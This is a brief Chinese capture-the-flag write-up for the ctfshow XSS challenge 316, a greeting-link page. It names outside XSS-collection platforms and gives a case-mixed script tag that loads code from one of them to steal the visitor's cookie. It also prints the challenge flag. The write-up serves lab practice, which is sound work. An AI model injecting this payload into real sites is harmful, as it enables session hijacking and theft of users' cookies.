# ctfshow-xss316



##### 参考链接

其他大佬链接

feng  https://ego00.blog.csdn.net/article/details/114079028

Y4	 https://blog.csdn.net/solitudi/article/details/111568030?spm=1001.2014.3001.5501

bit   https://www.xl-bit.cn/index.php/archives/120/



```
圣诞快乐，写下祝福语，生成链接，发送给朋友，可以领取十个鸡蛋！
祝福语
请输入祝福语
 
生成链接
```

```js
既然前面是反射型xss  其实不管它是反射还是存储 
主要还是需要我们利用xss平台 获取cookie


xss平台
https://ww.rs/
https://hk.sb/


输入框输入
<sCRiPt sRC=https://ww.rs/wIzi></sCrIpT>


ctfshow{a42d42fa-6298-45c8-833f-10c1478d6d02}




```

